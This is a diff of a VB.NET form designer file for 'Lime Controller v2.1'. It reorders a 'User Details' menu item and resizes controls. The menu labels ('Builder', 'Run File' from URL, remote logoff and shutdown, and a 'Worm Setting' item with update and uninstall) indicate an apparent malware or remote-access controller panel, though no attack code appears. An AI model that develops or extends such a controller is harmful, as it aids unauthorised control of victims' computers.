@@ -38,6 +38,7 @@ Partial Class Form1
         Me.ContextMenuStrip1 = New System.Windows.Forms.ContextMenuStrip(Me.components)
         Me.BuilderToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.ToolStripSeparator1 = New System.Windows.Forms.ToolStripSeparator()
+        Me.XxxToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.VvvToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.FromDiskToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
         Me.FromURLToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
@@ -54,7 +55,6 @@ Partial Class Form1
         Me.CloseToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.ToolStripSeparator2 = New System.Windows.Forms.ToolStripSeparator()
         Me.AboutToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
-        Me.XxxToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
         Me.StatusStrip1 = New System.Windows.Forms.StatusStrip()
         Me.ToolStripStatusLabel1 = New System.Windows.Forms.ToolStripStatusLabel()
         Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
@@ -130,68 +130,74 @@ Partial Class Form1
         Me.ContextMenuStrip1.Name = "ContextMenuStrip1"
         Me.ContextMenuStrip1.RenderMode = System.Windows.Forms.ToolStripRenderMode.Professional
         Me.ContextMenuStrip1.ShowImageMargin = False
-        Me.ContextMenuStrip1.Size = New System.Drawing.Size(280, 268)
+        Me.ContextMenuStrip1.Size = New System.Drawing.Size(199, 196)
         '
         'BuilderToolStripMenuItem
         '
         Me.BuilderToolStripMenuItem.Name = "BuilderToolStripMenuItem"
-        Me.BuilderToolStripMenuItem.Size = New System.Drawing.Size(279, 42)
+        Me.BuilderToolStripMenuItem.Size = New System.Drawing.Size(198, 30)
         Me.BuilderToolStripMenuItem.Text = "Builder"
         '
         'ToolStripSeparator1
         '
         Me.ToolStripSeparator1.Name = "ToolStripSeparator1"
-        Me.ToolStripSeparator1.Size = New System.Drawing.Size(276, 6)
+        Me.ToolStripSeparator1.Size = New System.Drawing.Size(195, 6)
+        '
+        'XxxToolStripMenuItem
+        '
+        Me.XxxToolStripMenuItem.Name = "XxxToolStripMenuItem"
+        Me.XxxToolStripMenuItem.Size = New System.Drawing.Size(198, 30)
+        Me.XxxToolStripMenuItem.Text = "User Details"
         '
         'VvvToolStripMenuItem
         '
         Me.VvvToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.FromDiskToolStripMenuItem1, Me.FromURLToolStripMenuItem1})
         Me.VvvToolStripMenuItem.Name = "VvvToolStripMenuItem"
-        Me.VvvToolStripMenuItem.Size = New System.Drawing.Size(279, 42)
+        Me.VvvToolStripMenuItem.Size = New System.Drawing.Size(198, 30)
         Me.VvvToolStripMenuItem.Text = "Run File"
         '
         'FromDiskToolStripMenuItem1
         '
         Me.FromDiskToolStripMenuItem1.Name = "FromDiskToolStripMenuItem1"
-        Me.FromDiskToolStripMenuItem1.Size = New System.Drawing.Size(224, 42)
+        Me.FromDiskToolStripMenuItem1.Size = New System.Drawing.Size(177, 30)
         Me.FromDiskToolStripMenuItem1.Text = "From Disk"
         '
         'FromURLToolStripMenuItem1
         '
         Me.FromURLToolStripMenuItem1.Name = "FromURLToolStripMenuItem1"
-        Me.FromURLToolStripMenuItem1.Size = New System.Drawing.Size(224, 42)
+        Me.FromURLToolStripMenuItem1.Size = New System.Drawing.Size(177, 30)
         Me.FromURLToolStripMenuItem1.Text = "From URL"
         '
         'ComputerToolStripMenuItem
         '
         Me.ComputerToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.LogoffToolStripMenuItem, Me.ToolStripMenuItem3, Me.ShutdownToolStripMenuItem})
         Me.ComputerToolStripMenuItem.Name = "ComputerToolStripMenuItem"
-        Me.ComputerToolStripMenuItem.Size = New System.Drawing.Size(279, 42)
+        Me.ComputerToolStripMenuItem.Size = New System.Drawing.Size(198, 30)
         Me.ComputerToolStripMenuItem.Text = "User PC"
         '
         'LogoffToolStripMenuItem
         '
         Me.LogoffToolStripMenuItem.Name = "LogoffToolStripMenuItem"
-        Me.LogoffToolStripMenuItem.Size = New System.Drawing.Size(226, 42)
+        Me.LogoffToolStripMenuItem.Size = New System.Drawing.Size(177, 30)
         Me.LogoffToolStripMenuItem.Text = "Logoff"
         '
         'ToolStripMenuItem3
         '
         Me.ToolStripMenuItem3.Name = "ToolStripMenuItem3"
-        Me.ToolStripMenuItem3.Size = New System.Drawing.Size(226, 42)
+        Me.ToolStripMenuItem3.Size = New System.Drawing.Size(177, 30)
         Me.ToolStripMenuItem3.Text = "Restart"
         '
         'ShutdownToolStripMenuItem
         '
         Me.ShutdownToolStripMenuItem.Name = "ShutdownToolStripMenuItem"
-        Me.ShutdownToolStripMenuItem.Size = New System.Drawing.Size(226, 42)
+        Me.ShutdownToolStripMenuItem.Size = New System.Drawing.Size(177, 30)
         Me.ShutdownToolStripMenuItem.Text = "Shutdown"
         '
         'WormSettingToolStripMenuItem
         '
         Me.WormSettingToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.UpdateToolStripMenuItem, Me.RestartToolStripMenuItem1, Me.UninstallToolStripMenuItem1, Me.CloseToolStripMenuItem})
         Me.WormSettingToolStripMenuItem.Name = "WormSettingToolStripMenuItem"
-        Me.WormSettingToolStripMenuItem.Size = New System.Drawing.Size(279, 42)
+        Me.WormSettingToolStripMenuItem.Size = New System.Drawing.Size(198, 30)
         Me.WormSettingToolStripMenuItem.Text = "Controller Setting"
         '
         'UpdateToolStripMenuItem
@@ -199,64 +205,58 @@ Partial Class Form1
         Me.UpdateToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.FromDiskToolStripMenuItem, Me.FromURLToolStripMenuItem})
         Me.UpdateToolStripMenuItem.Name = "UpdateToolStripMenuItem"
         Me.UpdateToolStripMenuItem.ShowShortcutKeys = False
-        Me.UpdateToolStripMenuItem.Size = New System.Drawing.Size(229, 42)
+        Me.UpdateToolStripMenuItem.Size = New System.Drawing.Size(177, 30)
         Me.UpdateToolStripMenuItem.Text = "Update"
         '
         'FromDiskToolStripMenuItem
         '
         Me.FromDiskToolStripMenuItem.Name = "FromDiskToolStripMenuItem"
-        Me.FromDiskToolStripMenuItem.Size = New System.Drawing.Size(224, 42)
+        Me.FromDiskToolStripMenuItem.Size = New System.Drawing.Size(177, 30)
         Me.FromDiskToolStripMenuItem.Text = "From Disk"
         '
         'FromURLToolStripMenuItem
         '
         Me.FromURLToolStripMenuItem.Name = "FromURLToolStripMenuItem"
-        Me.FromURLToolStripMenuItem.Size = New System.Drawing.Size(224, 42)
+        Me.FromURLToolStripMenuItem.Size = New System.Drawing.Size(177, 30)
         Me.FromURLToolStripMenuItem.Text = "From URL"
         '
         'RestartToolStripMenuItem1
         '
         Me.RestartToolStripMenuItem1.Name = "RestartToolStripMenuItem1"
-        Me.RestartToolStripMenuItem1.Size = New System.Drawing.Size(229, 42)
+        Me.RestartToolStripMenuItem1.Size = New System.Drawing.Size(177, 30)
         Me.RestartToolStripMenuItem1.Text = "Reconnect"
         '
         'UninstallToolStripMenuItem1
         '
         Me.UninstallToolStripMenuItem1.Name = "UninstallToolStripMenuItem1"
-        Me.UninstallToolStripMenuItem1.Size = New System.Drawing.Size(229, 42)
+        Me.UninstallToolStripMenuItem1.Size = New System.Drawing.Size(177, 30)
         Me.UninstallToolStripMenuItem1.Text = "Uninstall"
         '
         'CloseToolStripMenuItem
         '
         Me.CloseToolStripMenuItem.Name = "CloseToolStripMenuItem"
-        Me.CloseToolStripMenuItem.Size = New System.Drawing.Size(229, 42)
+        Me.CloseToolStripMenuItem.Size = New System.Drawing.Size(177, 30)
         Me.CloseToolStripMenuItem.Text = "Close"
         '
         'ToolStripSeparator2
         '
         Me.ToolStripSeparator2.Name = "ToolStripSeparator2"
-        Me.ToolStripSeparator2.Size = New System.Drawing.Size(276, 6)
+        Me.ToolStripSeparator2.Size = New System.Drawing.Size(195, 6)
         '
         'AboutToolStripMenuItem
         '
         Me.AboutToolStripMenuItem.Name = "AboutToolStripMenuItem"
-        Me.AboutToolStripMenuItem.Size = New System.Drawing.Size(279, 42)
+        Me.AboutToolStripMenuItem.Size = New System.Drawing.Size(198, 30)
         Me.AboutToolStripMenuItem.Text = "About"
-        '
-        'XxxToolStripMenuItem
-        '
-        Me.XxxToolStripMenuItem.Name = "XxxToolStripMenuItem"
-        Me.XxxToolStripMenuItem.Size = New System.Drawing.Size(279, 42)
-        Me.XxxToolStripMenuItem.Text = "User Details"
         '
         'StatusStrip1
         '
         Me.StatusStrip1.BackColor = System.Drawing.Color.FromArgb(CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer), CType(CType(20, Byte), Integer))
         Me.StatusStrip1.ImageScalingSize = New System.Drawing.Size(24, 24)
         Me.StatusStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ToolStripStatusLabel1})
-        Me.StatusStrip1.Location = New System.Drawing.Point(0, 623)
+        Me.StatusStrip1.Location = New System.Drawing.Point(0, 635)
         Me.StatusStrip1.Name = "StatusStrip1"
-        Me.StatusStrip1.Size = New System.Drawing.Size(1365, 42)
+        Me.StatusStrip1.Size = New System.Drawing.Size(1365, 30)
         Me.StatusStrip1.SizingGrip = False
         Me.StatusStrip1.TabIndex = 5
         Me.StatusStrip1.Text = "StatusStrip1"
@@ -265,7 +265,7 @@ Partial Class Form1
         '
         Me.ToolStripStatusLabel1.ForeColor = System.Drawing.SystemColors.ActiveBorder
         Me.ToolStripStatusLabel1.Name = "ToolStripStatusLabel1"
-        Me.ToolStripStatusLabel1.Size = New System.Drawing.Size(276, 37)
+        Me.ToolStripStatusLabel1.Size = New System.Drawing.Size(180, 25)
         Me.ToolStripStatusLabel1.Text = "ToolStripStatusLabel1"
         '
         'Timer1
@@ -288,7 +288,7 @@ Partial Class Form1
         Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
         Me.Name = "Form1"
         Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
-        Me.Text = "Lime Controller v2.0"
+        Me.Text = "Lime Controller v2.1"
         Me.ContextMenuStrip1.ResumeLayout(False)
         Me.StatusStrip1.ResumeLayout(False)
         Me.StatusStrip1.PerformLayout()
